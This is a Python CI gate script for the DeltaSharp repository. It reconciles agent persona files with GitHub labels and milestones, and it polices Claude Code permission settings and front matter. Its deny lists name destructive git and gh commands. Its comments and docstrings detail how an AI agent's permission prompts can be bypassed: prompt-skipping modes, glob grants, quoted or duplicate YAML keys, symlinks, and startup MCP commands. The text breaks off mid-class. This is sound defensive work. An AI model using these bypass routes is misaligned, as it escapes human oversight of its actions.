#!/usr/bin/env python3
"""Roster ↔ label-taxonomy reconciliation gate for DeltaSharp (STORY-00.6.2, #452).

PR #449 established `docs/planning/label-taxonomy.md` with a *manual* reconciliation
of the persona roster, the `persona:<slug>` GitHub labels, `CODEOWNERS`, and the
feature-request milestone dropdown. This script turns that manual snapshot into a
lightweight, re-runnable gate so the three reconciliations below — plus three local validations
of the `.claude/settings.json` permission surface, of the `.claude/commands` /
`.claude/skills` front matter, and of the TRACKED startup configuration (`.mcp.json`,
`.claude/settings.local.json`) — fail CI instead of silently rotting:

  1. **Roster ↔ persona labels.** Every `.claude/agents/*.md` wrapper (a markdown file
     whose front matter carries a `name:`; fence-less markdown there is ignored) must have a
     matching `persona:<slug>` label and vice-versa. The roster is NON-RECURSIVE — only
     wrappers directly in `.claude/agents/` are roster entries; a `name:`-bearing file
     nested in a subdirectory is an INTEGRITY ERROR (the workflow path filter would still
     ship it), not a silently ignored file. Each wrapper's front matter is also held to a
     POLICY: `permissionMode` may only be `default` or `plan` (`bypassPermissions` and the
     other prompt-skipping modes auto-run commands the settings allow/deny lists never see),
     no `hooks`/`mcpServers`/`isolation`/`env` key may appear (`isolation: worktree` runs
     `git worktree add` with no prompt), and any other unknown key is rejected —
     a wrapper is a persona brief, not an execution-configuration surface. The front matter
     is read by a STRICT, fail-closed subset reader (:func:`_read_frontmatter`), not a
     tolerant line regex: a quoted key, a space before the colon, a flow mapping, a wholly
     indented mapping or a duplicate key is reported as an integrity problem instead of
     being skipped, because a real YAML parser reads the dangerous key out of every one of
     those spellings. Likewise a file that opens a `---` fence but declares no `name:` is a
     persona CANDIDATE and fails rather than being dismissed as ordinary markdown. The GitHub
     50-character label cap forces
     exactly one documented truncation (the trailing `-engineer` is dropped from
     `persona:dotnet-vectorized-columnar-compute-engineer`); that truncation is allowed ONLY
     when `label-taxonomy.md` records it. The roster is reconciled against BOTH the persona
     labels *documented* in `label-taxonomy.md` (a committed list, checked even `--offline`,
     so a removed/added agent is caught with no network) and the LIVE GitHub labels (which
     additionally catches drift introduced in the GitHub UI). Any other difference FAILS.
  2. **CODEOWNERS parse errors.** `GET /repos/{repo}/codeowners/errors` must report an empty
     `errors` array — a syntax or unknown-owner error FAILS. The check is pinned to a `ref`
     (the PR head/merge SHA in CI, else the default branch) so a PR that breaks CODEOWNERS
     fails the PR gate rather than slipping through to be caught only post-merge.
  3. **Milestone dropdown ↔ live milestones.** The `id: milestone` dropdown in
     `.github/ISSUE_TEMPLATE/feature_request.yml` must offer exactly the live GitHub
     milestones, plus the documented "needs triage" sentinel. A stale/renamed option or a
     live milestone missing from the dropdown FAILS.

Alongside those three reconciliations the gate runs three local VALIDATIONS. The first is
`settings-permissions` (:func:`validate_settings`): `.claude/settings.json` must parse and its
`permissions.allow` / `permissions.deny` must be LISTS OF STRINGS. It then rejects, precisely:
the enumerated mutating git/gh prefixes in :data:`FORBIDDEN_ALLOW_COMMANDS` (`gh api`,
`git push`, `gh pr merge`, ... — including via a broad `Bash(gh:*)`/`Bash(git:*)`, and
CASE-INSENSITIVELY, because on a case-insensitive filesystem `Bash(GH api:*)` still resolves
to the real `gh`); any WILDCARD or TOOL-WIDE Bash grant (`Bash`, `Bash()`, `Bash(*)`,
`Bash(:*)`, and any command still holding a `*` once the trailing `:*` argument wildcard is
stripped — Claude Code reads such a `*` as a GLOB, so `Bash(gh *)` matches `^gh.*$` and
auto-runs `gh api`); and any `permissions.defaultMode` other than `default`/`plan`
(`bypassPermissions` and `dontAsk` skip every prompt; `acceptEdits` auto-approves file writes).
The KEY SURFACE is an allowlist rather than a blocklist: only `permissions` plus the inert
knobs `$schema`, `model`, `cleanupPeriodDays`, `includeCoAuthoredBy`, `attribution`,
`outputStyle`, `language`, `spinnerTipsEnabled` may appear at top level, and `permissions`
may hold only `allow`/`deny`/`defaultMode` (`additionalDirectories` gets its own message).
Every executable-valued key — `hooks`, `env`, `apiKeyHelper`, `statusLine`, ... — is thus
rejected, and so is any key a future Claude Code release adds that this gate has never heard
of. It also REQUIRES all 14 :data:`REQUIRED_DENY_ENTRIES`.
Allow entries outside those rules are NOT policed — the check bounds the blast radius of this
file, it does not certify the whole permission surface. It is a policy check on a
security-relevant file rather than a reconciliation between two sources, but it shares the
gate's report/exit contract. Run it alone with `--validate-settings-only`.

The second local validation is `command-skill-frontmatter`
(:func:`scan_command_skill_frontmatter`), which closes the THIRD front-matter surface Claude
Code reads as runtime configuration: `.claude/commands/**/*.md` slash commands and
`.claude/skills/**/SKILL.md` manifests. A tracked command file carrying
`allowed-tools: Bash(<cmd>:*)` was proven to RUN that command with NO permission prompt —
a grant neither the settings policy nor the wrapper policy above can see. Every such file is
read by the same STRICT reader (:func:`_read_frontmatter`, so a quoted key or an unclosed
fence is a problem, not a skip) and held to the same allowlist discipline: the keys in
:data:`FORBIDDEN_COMMAND_SKILL_KEYS` (`allowed-tools`, `permissionMode`, `hooks`,
`mcpServers`, `env`, `isolation`) are rejected by name, and any key outside
:data:`ALLOWED_COMMAND_KEYS` (commands) / :data:`ALLOWED_SKILL_KEYS` (skills) is rejected on
sight. Both directories are OPTIONAL — a missing one reports 0 files scanned rather than
passing silently — and the paths are overridable with `--commands-dir` / `--skills-dir`.

SYMLINKS are rejected, and the rule is decided BY GIT: any tracked symlink under `.claude/`
or at `.mcp.json` / `.claude/settings.local.json` / `.claude/settings.json` FAILS, because git
records the link as index mode `120000` whether or not it currently resolves — so a DANGLING
link cannot hide (FINAL-CERT F1). That mattered: every path check here asks the filesystem
(`os.path.lexists`, an `os.walk` name match), and a link pointing at `bin/`, `obj/` or
`artifacts/` is absent in the checkout-only CI job while resolving to real configuration on
every machine that has run `dotnet build`. The walks additionally report ANY symlink they see
— the directory roots themselves, and every `filenames` entry regardless of name — so the
rule also holds where git cannot be asked, while `followlinks=False` keeps a link loop from
hanging the gate. When git cannot answer at all (no git, not a checkout) the git half is a
SKIP with the reason, never a pass.

The third local validation is `tracked-startup-config`
(:func:`validate_startup_config`), which covers the two startup surfaces the settings policy
never opens: a repo-root `.mcp.json` (every `mcpServers[*].command` is SPAWNED when the CLI
launches, with no prompt — remote code execution on `git checkout`, ranked with `hooks` and
`apiKeyHelper`) and `.claude/settings.local.json` (honored exactly like `settings.json`,
and the place every remedy message here sends per-machine grants — advice that holds only
while it is untracked). Only a TRACKED file FAILS: tracking is decided with
`git ls-files --error-unmatch` (argv form, run in the checkout), so an untracked local copy
is reported in the detail line rather than reddening a developer's run, while in CI — where
the checkout holds tracked files only — a committed one is caught. A tracked but MALFORMED
`.mcp.json` fails (an unreadable startup config is not evidence that nothing starts); an
empty `mcpServers` mapping passes. When git cannot answer (no git, not a checkout) the check
reports SKIP with the reason and `--require-remote` turns that into exit 2, so "could not
verify" never reads as "verified clean". Override the path with `--mcp-config`.

Design constraints
------------------
* **Stdlib only.** No PyYAML / no third-party imports, so the gate is deterministic and
  installs nothing. The milestone dropdown is parsed with a small, targeted reader for the
  GitHub issue-form structure (see `parse_milestone_options`).
* **Degrades gracefully off-network.** The roster read, the dropdown parse, and the roster ↔
  *documented*-labels reconciliation are local (filesystem) and always run. So is
  `tracked-startup-config`, whose only subprocesses are `git ls-files` calls in the checkout
  (tracking, and the `120000` symlink query) — local, not network, and reported as an explicit
  SKIP (never a pass) if git cannot answer. The LIVE
  GitHub-API lookups (labels, milestones, codeowners/errors) shell out to `gh`; if `gh` is
  missing or unauthenticated they are SKIPPED with a warning so local dev works without a
  token. Pass `--require-remote` (CI does) to turn a remote check that could not RUN into a
  hard **exit 2** (a gh/API outage, distinct from drift — never miscounted as exit-1 drift),
  and `--offline` to skip every live remote check (the documented-labels check still runs).

Usage
-----
    # Full gate (CI): all remote checks must run and pass.
    python3 tools/reconcile/roster-labels.py --repo khaines/deltasharp --require-remote

    # Local dev: remote checks run if `gh` is authenticated, otherwise skip.
    python3 tools/reconcile/roster-labels.py

    # Prove the gate's own reconciliation logic with in-memory fixtures (no network):
    python3 tools/reconcile/roster-labels.py --selftest

    # Validate ONLY the .claude/settings.json permission surface (local, fail-fast CI step):
    python3 tools/reconcile/roster-labels.py --validate-settings-only

Exit codes: 0 = reconciled (no drift), 1 = drift detected (a check FAILED), 2 = usage/data
error, OR a required remote check could not run (`--require-remote` with `gh`/the GitHub API
unavailable) — a remote outage, reported distinctly from drift so an outage never reads as
roster drift — OR a local check that could not verify its input (environment — run the gate
inside the git checkout). The three exit-2 causes carry different messages because they send
the responder to different runbooks: wait out an outage, fix the repo, or fix the environment
the gate ran in. The split is by WHO ACTS, not by where the error was raised: roster INTEGRITY
problems (nested / unparseable / nameless wrappers) exit 1 even when they leave the roster
empty, because the author fixes them in the repo; only a MISSING or genuinely empty agents
directory — nothing to verify against — exits 2 alongside the remote-outage case.
"""

from __future__ import annotations

import argparse
import contextlib
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unicodedata
import urllib.parse

# --- Constants ---------------------------------------------------------------------------

PERSONA_PREFIX = "persona:"
# GitHub caps label names at 50 characters; a persona label longer than this must be
# truncated (and the truncation documented in label-taxonomy.md).
GITHUB_LABEL_MAX = 50
# The project's documented truncation strategy drops this redundant trailing token.
TRUNCATION_SUFFIX = "-engineer"
DEFAULT_REPO = "khaines/deltasharp"
# Dropdown options that are intentionally NOT backed by a live GitHub milestone.
SENTINEL_MILESTONE_OPTIONS = frozenset({"Unsure / needs triage"})

# The configuration directory the CLI reads at startup, and the root path every local check
# scopes its git question to (:func:`claude_root_pathspec`). The index is listed once with no
# pathspec and these paths select from the answer; the only per-file question,
# `git ls-files --error-unmatch`, is asked with an absolute path after `--`.
CLAUDE_DIR_NAME = ".claude"
DEFAULT_AGENTS_DIR = os.path.join(CLAUDE_DIR_NAME, "agents")
DEFAULT_COMMANDS_DIR = os.path.join(".claude", "commands")
DEFAULT_SKILLS_DIR = os.path.join(".claude", "skills")
DEFAULT_SETTINGS = os.path.join(".claude", "settings.json")
# Two startup surfaces the CLI reads that live OUTSIDE `.claude/settings.json` (CERT-F2/F3):
# `.mcp.json` at the repo root (its `mcpServers[*].command` is spawned when the CLI launches,
# with no prompt) and `.claude/settings.local.json` (honored exactly like settings.json but
# meant to be per-machine and gitignored — every remedy message in this gate points grants
# there, which only holds while the file is untracked).
DEFAULT_MCP_CONFIG = ".mcp.json"
SETTINGS_LOCAL_NAME = "settings.local.json"
# The second config root. `.github/agents` and `.github/skills` are the GENERATED Copilot
# mirror of `.claude/agents` and `.claude/skills` (`tools/aiconfig/generate-copilot.py`), and
# `.github/copilot-instructions.md` the mirror of `CLAUDE.md`. They are read and executed by
# Copilot on the same machines the Claude tree runs on, so they sit inside the same C7 trust
# boundary and are policed the same way. Only these three children are in scope — see
# :data:`POLICED_GITHUB_CHILDREN`.
GITHUB_DIR_NAME = ".github"
DEFAULT_COPILOT_AGENTS_DIR = os.path.join(GITHUB_DIR_NAME, "agents")
DEFAULT_COPILOT_SKILLS_DIR = os.path.join(GITHUB_DIR_NAME, "skills")
DEFAULT_COPILOT_INSTRUCTIONS = os.path.join(GITHUB_DIR_NAME, "copilot-instructions.md")
DEFAULT_FEATURE_FORM = os.path.join(".github", "ISSUE_TEMPLATE", "feature_request.yml")
DEFAULT_TAXONOMY = os.path.join("docs", "planning", "label-taxonomy.md")

# label-taxonomy.md carries a delimited, machine-readable list of the persona labels so the
# gate has a COMMITTED source of truth for them. This lets `--offline` reconcile the roster
# against the labels the project *documents* (catching a removed/added agent) without the
# live GitHub label set; remote mode additionally diffs the roster against the LIVE labels.
PERSONA_LABELS_BEGIN = "<!-- BEGIN persona-labels"
PERSONA_LABELS_END = "<!-- END persona-labels"

# --- .claude/settings.json permission policy ---------------------------------------------
# Commands that must NEVER be auto-allowed (they mutate the repo, GitHub state, or the local
# worktree layout, so they have to prompt). An allow entry is rejected when its command is a
# TOKEN-PREFIX of one of these (`gh` covers `gh api`; `git` covers `git push`) or when one of
# these is a token-prefix of it (`gh api repos/x` IS a `gh api` call).
#
# This table is only the ENUMERATED half of the allow policy. Independently of it, the allow
# loop rejects every grant that is not a single literal command: a TOOL-WIDE `Bash` / `Bash()`
# entry (Claude Code reads a bare tool name as "allow every Bash command"), a blanket
# `Bash(*)` / `Bash(:*)`, and any entry whose command still contains a `*` after the trailing
# `:*` argument wildcard is stripped — Claude Code expands such a `*` as a GLOB, so
# `Bash(gh *)`, `Bash(gh api*)` and `Bash(git *)` compile to `^gh.*$` / `^git.*$` and auto-run
# `gh api` / `git push` with no prompt. The comparison is CASE-INSENSITIVE (`_bash_command`
# lowercases): on macOS/Windows the filesystem is case-insensitive, so `Bash(GH api:*)`
# resolves to the real `gh` and Claude Code honors the rule. Allow entries that are neither
# listed here nor wildcard/tool-wide grants are NOT policed.
FORBIDDEN_ALLOW_COMMANDS = (
    "gh api",
    "git push",
    "git fetch",
    "gh pr merge",
    "gh release",
    "gh secret",
    "git worktree add",
    "git worktree remove",
)
# Deny entries that must be present verbatim. The deny list is the belt to the allow list's
# braces: an entry deleted here silently re-opens a mutating command to a future broad allow
# rule or an interactive "yes". Claude Code's matcher is word-boundary aware
# (`startsWith(prefix + " ")`), so `Bash(git push --force:*)` denies `git push --force ...`
# WITHOUT catching `git push --force-with-lease`.
REQUIRED_DENY_ENTRIES = (
    "Bash(git branch -D:*)",
    "Bash(git branch -d:*)",
    "Bash(git branch -M:*)",
    "Bash(git branch -m:*)",
    "Bash(git push -f:*)",
    "Bash(git push --force:*)",
    "Bash(gh api -X POST:*)",
    "Bash(gh api -X PUT:*)",
    "Bash(gh api -X PATCH:*)",
    "Bash(gh api -X DELETE:*)",
    "Bash(gh api --method:*)",
    "Bash(gh pr merge:*)",
    "Bash(gh release:*)",
    "Bash(gh secret:*)",
)
# `permissions.defaultMode` values that switch the prompt OFF wholesale. They make every
# allow/deny refinement above moot (both were proven to auto-run commands), so neither may
# appear in the tracked project settings.
FORBIDDEN_DEFAULT_MODES = ("bypassPermissions", "dontAsk")
# ...and, like the key surface, `defaultMode` is policed by an ALLOWLIST rather than only that
# blocklist: `acceptEdits` still auto-approves every file write with no prompt, which in a
# TRACKED settings file means another author's branch can edit the worktree unattended, so
# only the two fully prompting modes may appear (absent is fine — the session default applies).
ALLOWED_DEFAULT_MODES = ("default", "plan")

# The tracked project settings are policed by an ALLOWLIST, not a blocklist. Claude Code keeps
# adding settings keys whose value is a COMMAND STRING that runs with no permission prompt
# (`hooks`, `env`, `apiKeyHelper`, `statusLine`, ...); enumerating them was proven incomplete
# (R5-F1), so anything not named here is rejected on sight and belongs in settings.local.json.
# Only inert, non-executable knobs are listed.
ALLOWED_TOP_LEVEL_KEYS = (
    "$schema",
    "permissions",
    "model",
    "cleanupPeriodDays",
    "includeCoAuthoredBy",
    "attribution",
    "outputStyle",
    "language",
    "spinnerTipsEnabled",
)
# Likewise inside `permissions`: only the three keys this gate actually validates may appear,
# so a future permission knob cannot widen the surface behind the validator's back.
ALLOWED_PERMISSION_KEYS = ("allow", "deny", "defaultMode")
# Top-level keys whose value is (or contains) a COMMAND LINE that Claude Code executes with no
# permission prompt. They are all rejected by the allowlist above; this table only exists so
# the rejection carries the specific "this runs a command" message instead of the generic one.
# `apiKeyHelper` is the sharpest: it runs at CLI STARTUP, before any tool call is made.
HELPER_COMMAND_KEYS = (
    "apiKeyHelper",
    "awsAuthRefresh",
    "awsCredentialExport",
    "gcpAuthRefresh",
    "otelHeadersHelper",
    "processWrapper",
    "policyHelpers",
    "proxyAuthHelper",
    "statusLine",
    "subagentStatusLine",
    "fileSuggestion",
)

# --- .claude/agents/*.md front-matter policy ---------------------------------------------
# A persona wrapper is a BRIEF, not an execution-configuration surface. Claude Code reads
# several wrapper front-matter keys as runtime configuration, and `permissionMode` is the
# sharpest: `bypassPermissions` (also `acceptEdits`, `dontAsk`, `auto`) makes every tool call
# in that subagent run with NO permission prompt, so a tracked wrapper can auto-run a command
# the `.claude/settings.json` allow/deny policy above would never have granted. The roster
# gate previously read only `name:`, so such a wrapper shipped unseen (FINAL-F1). Only the
# prompting modes may appear in a tracked wrapper; ABSENT is fine (it inherits the session).
ALLOWED_AGENT_PERMISSION_MODES = ("default", "plan")
# Front-matter keys that carry executable commands, connect external servers/environment, or
# provision worktrees. They are rejected by name (they are absent from the allowlist below
# too, but the specific message says WHY) — put them in untracked local configuration if a
# particular worktree genuinely needs them. `isolation: worktree` belongs here because it was
# proven to run `git worktree add` with NO permission prompt — the very command the settings
# allow policy (:data:`FORBIDDEN_ALLOW_COMMANDS`) refuses to auto-allow.
FORBIDDEN_AGENT_KEYS = ("hooks", "mcpServers", "isolation", "env")
# Why each forbidden key is rejected, appended to its message so the report is actionable.
FORBIDDEN_AGENT_KEY_REASONS = {
    "hooks": "it runs arbitrary commands on tool events with no permission prompt",
    "mcpServers": "it launches/connects an external MCP server outside the permission gate",
    "isolation": "it provisions a worktree, running `git worktree add` with no permission "
                 "prompt — a command the settings allow policy refuses to auto-allow",
    "env": "it overrides the environment of every auto-allowed command (PATH, GIT_*, ...)",
}
# Same allowlist discipline as the settings check: a wrapper may carry only these inert,
# brief-shaped keys (each probed against the CLI as non-executing), so a future Claude Code
# release that adds a command-valued wrapper key cannot widen the surface behind this gate's
# back. `isolation`/`hooks`/`mcpServers`/`env` are deliberately NOT here.
#
# The list is deliberately MINIMAL: the four keys the 25 tracked wrappers actually use, plus
# the two NARROWING knobs (`disallowedTools` removes tools, `permissionMode` is separately
# constrained to the prompting modes). Cosmetic or speculative keys are NOT pre-admitted —
# an allowlist entry nobody needs is surface this gate can never take back, and the rejection
# message already names the key to add here when a wrapper genuinely needs one.
ALLOWED_AGENT_KEYS = (
    "name",
    "description",
    "tools",
    "disallowedTools",
    "model",
    "permissionMode",
)

# --- .claude/commands/**.md + .claude/skills/**/SKILL.md front-matter policy --------------
# Slash-command files and skill manifests are the THIRD front-matter surface Claude Code
# reads as runtime configuration, and this gate did not look at either: a tracked
# `.claude/commands/<x>.md` carrying `allowed-tools: Bash(extdiff:*)` was proven to RUN that
# command with NO permission prompt — out of a file `.claude/settings.json` cannot describe,
# that the `.claude/agents/**` policy never covers, and that the workflow path filter did not
# even trigger the gate on.
#
# `allowed-tools` is the sharpest key here because it is a permission GRANT rather than a
# narrowing filter: it auto-approves, for every invocation of that file, tool calls the
# settings allow/deny policy would have prompted for. The rest of the table is the same
# executable/config-bearing set :data:`FORBIDDEN_AGENT_KEYS` rejects on a persona wrapper.
FORBIDDEN_COMMAND_SKILL_KEYS = (
    "allowed-tools",
    "permissionMode",
    "hooks",
    "mcpServers",
    "env",
    "isolation",
)
# Why each key is rejected, appended to its message so the report is actionable.
FORBIDDEN_COMMAND_SKILL_KEY_REASONS = {
    "allowed-tools": "it GRANTS unprompted tool use for every invocation of this file",
    "permissionMode": "it switches the permission prompt off for the whole invocation",
    "hooks": "it runs arbitrary commands on tool events with no permission prompt",
    "mcpServers": "it launches/connects an external MCP server outside the permission gate",
    "env": "it overrides the environment of every auto-allowed command (PATH, GIT_*, ...)",
    "isolation": "it provisions a worktree, running `git worktree add` with no permission "
                 "prompt — a command the settings allow policy refuses to auto-allow",
}
# Same allowlist discipline as the settings and wrapper surfaces, and just as MINIMAL: a
# tracked slash command is a PROMPT and a tracked SKILL.md is a prompt with a name, so only
# inert descriptive keys may appear. Anything else — including a key a future Claude Code
# release adds — is rejected on sight, because an unknown key may grant tool use.
ALLOWED_COMMAND_KEYS = ("description", "argument-hint", "model")
ALLOWED_SKILL_KEYS = ("name", "description", "argument-hint", "model")


# --- Output helpers ----------------------------------------------------------------------

def _log(msg: str = "") -> None:
    print(msg, flush=True)


def _error(msg: str) -> None:
    # GitHub Actions annotation; renders inline on the PR.
    print(f"::error::{msg}", flush=True)


def _warning(msg: str) -> None:
    print(f"::warning::{msg}", flush=True)


# --- Repo resolution ---------------------------------------------------------------------

def resolve_repo(explicit: "str | None", offline: bool = False) -> str:
    """Resolve OWNER/REPO from --repo, the Actions env, `gh`, or the default.

    Under ``--offline`` we must not shell out to `gh` at all (that would break the
    "skip all GitHub-API checks" contract), so resolution stops at the environment /
    ``DEFAULT_REPO`` and never invokes the CLI.
    """
    if explicit:
        return explicit
    env = os.environ.get("GITHUB_REPOSITORY")
    if env:
        return env
    if offline:
        return DEFAULT_REPO
    ok, out, _ = _gh(["repo", "view", "--json", "nameWithOwner", "--jq", ".nameWithOwner"])
    if ok and out.strip():
        return out.strip()
    return DEFAULT_REPO


def resolve_ref(explicit: "str | None") -> "str | None":
    """Resolve the git ref whose CODEOWNERS should be validated.

    Prefer an explicit ``--ref``, then ``$GITHUB_SHA`` (in GitHub Actions this is the
    checked-out commit — the PR *merge* commit for ``pull_request`` events, i.e. the
    PR-head-merged state). Returns ``None`` to let the API validate the repository's
    DEFAULT branch, the correct fallback for local runs.
    """
    if explicit:
        return explicit.strip() or None
    env_sha = os.environ.get("GITHUB_SHA")
    if env_sha and env_sha.strip():
        return env_sha.strip()
    return None


# --- Local roster reader -----------------------------------------------------------------

class FrontmatterError(Exception):
    """A front-matter block this gate refuses to interpret (it must FAIL, never be ignored).

    The reader below is a strict, stdlib-only subset of YAML, not a YAML parser. Anything
    outside that subset — a quoted key, `key :`, a flow mapping, a wholly indented mapping —
    is a spelling a REAL YAML parser (i.e. Claude Code) reads as configuration while this
    reader would not. Silently ignoring such a line is precisely the bypass VERIFY-F1
    demonstrated, so the reader raises and :func:`read_roster` turns the raise into an
    integrity problem: the unparseable wrapper reddens the gate instead of sliding through.

    The message is the sentence tail appended after ``agent wrapper '<path>' ``.
    """


# The ONLY top-level form the strict reader accepts: an unquoted, plain key at column 0,
# immediately followed by `:` and then whitespace or end-of-line. `key :` (space before the
# colon), `"key":` and `key:value` are all deliberately OUTSIDE this grammar — each is read
# differently (or identically, in the quoted case) by a real YAML parser, so each is reported
# as unparseable rather than skipped.
_FRONTMATTER_KEY_LINE = re.compile(r"^([A-Za-z_][A-Za-z0-9_-]*):(\s|$)")


def _is_fence(line: str) -> bool:
    """True only for an UNINDENTED `---` fence line.

    The indentation matters: inside a block scalar (`description: |`) an INDENTED `  ---` is
    ordinary text, not the end of the front matter. Terminating on `line.strip() == "---"`
    therefore stopped the reader early and left every key after it — including a
    `permissionMode: bypassPermissions` at column 0 — completely unread (0 problems).
    """
    return line.rstrip() == "---" and not line[:1].isspace()


def _read_frontmatter(path: str) -> "tuple[dict[str, str] | None, list[str]]":
    """Return (top-level `key: value` pairs, duplicate keys) for a YAML front-matter block.

    Returns ``(None, [])`` when the file has NO front-matter fence at all (plain markdown —
    a README, a template): such a file is not a persona candidate. A file that DOES open a
    `---` fence is a persona candidate and is read STRICTLY.

    Stdlib-only and deliberately shallow (no PyYAML), but FAIL-CLOSED rather than lenient:
    every line between the fences must be one of

    * blank;
    * a `#` comment;
    * an INDENTED continuation (a block scalar's text, a nested mapping/sequence under a
      recognized top-level key) — allowed only AFTER a top-level key has been seen, so a
      mapping that is indented in its entirety cannot hide its keys from this reader. An
      indented `  ---` is such a continuation, NOT the closing fence (see :func:`_is_fence`);
    * a top-level key matching :data:`_FRONTMATTER_KEY_LINE` (`key: value` / `key:`).

    Any other non-blank line — a quoted key (`"permissionMode": bypassPermissions`), a space
    or tab before the colon (`permissionMode : bypassPermissions`), a flow mapping
    (`{name: x, permissionMode: y}`), a column-0 `-` list item, a stray document marker, or a
    missing closing fence — raises :class:`FrontmatterError`. Every one of those spellings
    was proven to yield ZERO problems from the old column-0 line regex while a real YAML
    parser reads the dangerous key (VERIFY-F1).

    DUPLICATE top-level keys are returned separately rather than silently resolved: this
    reader is first-wins and YAML is last-wins, so `permissionMode: default` followed by
    `permissionMode: bypassPermissions` would validate clean here and run unprompted there.
    The dict keeps the FIRST value (so a wrapper still has a `name:` to report against) and
    the duplicate is raised as its own integrity problem, which fails the gate regardless of
    which value either implementation would have picked.

    Values are returned as written (surrounding quotes stripped); a nested block's value is
    the empty string, which is enough for the policy in :func:`validate_agent_frontmatter` —
    that policy cares about which keys are PRESENT plus the scalar `permissionMode`.
    """
    try:
        with open(path, "r", encoding="utf-8") as handle:
            lines = handle.read().splitlines()
    except (OSError, UnicodeDecodeError) as exc:
        # An unreadable file in the agents directory must not read as "no front matter":
        # the workflow path filter would still ship it. Fail closed.
        #
        # UnicodeDecodeError is caught alongside OSError deliberately: a wrapper saved in
        # UTF-16/Latin-1 (or any file whose bytes are not UTF-8) otherwise unwound all the
        # way out of read_roster as an unhandled exception — the gate died with a traceback
        # that never named the offending file, which is a worse operator experience than the
        # drift it was meant to report. Here it becomes one named integrity problem.
        raise FrontmatterError(
            f"cannot be read ({exc.__class__.__name__}: {exc}), so its front matter cannot "
            f"be parsed strictly"
        ) from exc
    # A UTF-8 BOM ahead of the fence must not make the file read as plain markdown: editors
    # write one silently, and Claude Code still parses the front matter behind it.
    if lines:
        lines[0] = lines[0].lstrip("\ufeff")
    if not lines or not _is_fence(lines[0]):
        return (None, [])

    closing = None
    for index in range(1, len(lines)):
        if _is_fence(lines[index]):
            closing = index
            break
    if closing is None:
        raise FrontmatterError(
            "has front matter the gate cannot parse strictly (the opening `---` fence is "
            "never closed); add the closing `---` fence"
        )

    frontmatter: "dict[str, str]" = {}
    duplicates: "list[str]" = []
    for offset, line in enumerate(lines[1:closing], start=2):
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue  # blank line or comment
        match = _FRONTMATTER_KEY_LINE.match(line)
        if match is None:
            if line[:1] in (" ", "\t") and frontmatter:
                continue  # indented continuation under a recognized top-level key
            hint = ""
            if line.startswith("- "):
                # A column-0 `- item` is a block sequence written flush against its key
                # (`tools:\n- Read`). Real YAML reads the list; this reader cannot, so it
                # must still reject — but a rule with no remedy just strands the operator,
                # and the fix (indent the items) is one keystroke.
                hint = " (indent block-sequence items under their key)"
            raise FrontmatterError(
                f"has front matter the gate cannot parse strictly (line {offset}: "
                f"{stripped!r}); use plain `key: value` lines at column 0{hint}"
            )
        key = match.group(1)
        value = line[len(key) + 1 :].strip()
        if len(value) >= 2 and value[0] in "\"'" and value[-1] == value[0]:
            value = value[1:-1]  # quoted: the quotes delimit the value, `#` included
        else:
            # An UNQUOTED scalar ends at a ` #`: YAML reads the rest of the line as a
            # comment, so `permissionMode: default  # normal` is the mode `default`. Keeping
            # the comment made the gate reject a wrapper that is legal, safe and correct —
            # a false positive on the permission-mode allowlist, which is exactly the kind
            # of "the gate is wrong again" signal that trains people to route around it.
            # A value that is ONLY a comment (`model:  # tbd`) becomes the empty string,
            # which is what YAML reads there too.
            comment = re.search(r"(^|\s)#", value)
            if comment is not None:
                value = value[: comment.start()].rstrip()
        if key in frontmatter:
            if key not in duplicates:
                duplicates.append(key)
            continue  # first-wins here; the duplicate is reported instead of resolved
        frontmatter[key] = value
    return (frontmatter, duplicates)


def validate_agent_frontmatter(path: str, frontmatter: "dict[str, str]") -> "list[str]":
    """Return policy problems with one wrapper's front matter (empty ⇒ clean).

    A tracked persona wrapper is a BRIEF. Claude Code, however, reads parts of the wrapper
    front matter as RUNTIME CONFIGURATION, so an innocuous-looking `.claude/agents/*.md` edit
    can switch the permission prompt off for that subagent or attach an MCP server / hook —
    none of which the `.claude/settings.json` policy in :func:`validate_settings` can see.
    Three rules, checked in this order so the specific message wins over the generic one:

    * `permissionMode` must be absent or one of :data:`ALLOWED_AGENT_PERMISSION_MODES`
      (`default`, `plan`). `bypassPermissions`/`acceptEdits`/`dontAsk`/`auto` all skip the
      prompt, which was proven to auto-run a forbidden command with no prompt (FINAL-F1);
    * no key in :data:`FORBIDDEN_AGENT_KEYS` (`hooks`, `mcpServers`, `isolation`, `env`) —
      those are executable/config-bearing; `isolation: worktree` in particular runs
      `git worktree add` with no permission prompt;
    * every remaining key must be in :data:`ALLOWED_AGENT_KEYS` (`name`, `description`,
      `tools`, `disallowedTools`, `model`, `permissionMode`); an unknown key is rejected on
      sight, because a key this gate has never heard of may execute something. The list is
      intentionally minimal — a cosmetic key that no wrapper uses is surface admitted for
      nothing, and the rejection message names the key to add here if one is ever needed.

    Reported as roster INTEGRITY problems (they redden `roster<->documented-labels`, like a
    nested wrapper does), so the gate fails on the branch that introduces the wrapper.
    """
    problems: "list[str]" = []
    mode = frontmatter.get("permissionMode")
    if mode is not None and mode not in ALLOWED_AGENT_PERMISSION_MODES:
        problems.append(
            f"agent wrapper {path!r} sets permissionMode {mode!r}; tracked persona wrappers "
            f"may only use default or plan "
            f"(bypassPermissions/acceptEdits/dontAsk/auto skip prompts)"
        )
    for key in frontmatter:
        if key in FORBIDDEN_AGENT_KEYS:
            reason = FORBIDDEN_AGENT_KEY_REASONS.get(key)
            because = f" ({reason})" if reason else ""
            problems.append(
                f"agent wrapper {path!r} defines {key!r}, which is executable/config-bearing"
                f"{because}; tracked persona wrappers may carry only "
                f"{', '.join(repr(k) for k in ALLOWED_AGENT_KEYS)}"
            )
        elif key not in ALLOWED_AGENT_KEYS:
            problems.append(
                f"agent wrapper {path!r} carries unknown front-matter key {key!r}; tracked "
                f"persona wrappers may carry only "
                f"{', '.join(repr(k) for k in ALLOWED_AGENT_KEYS)} — a key this gate does not "
                f"understand may configure execution with no permission prompt"
            )
    return problems


# Clauses :func:`read_roster` appends to its "no persona wrappers found" FileNotFoundError
# when that emptiness is explained by integrity problems (nested wrappers, or unparseable /
# nameless ones) rather than by an absent directory. :func:`main` keys the EXIT CODE off
# them: integrity problems are DRIFT (exit 1, "fix the repo"), while a genuinely empty or
# missing agents directory is a data error the gate cannot run against (exit 2, which the
# workflow documents as "could not verify" and an operator reads as an outage). Conflating
# the two sends a responder hunting a GitHub outage that never happened.
INTEGRITY_CLAUSE_MARKERS = ("other integrity problem(s)", "found and ignored")


class _LinkMessage(str):
    """A problem message that CARRIES the path (and finding kind) it is about.

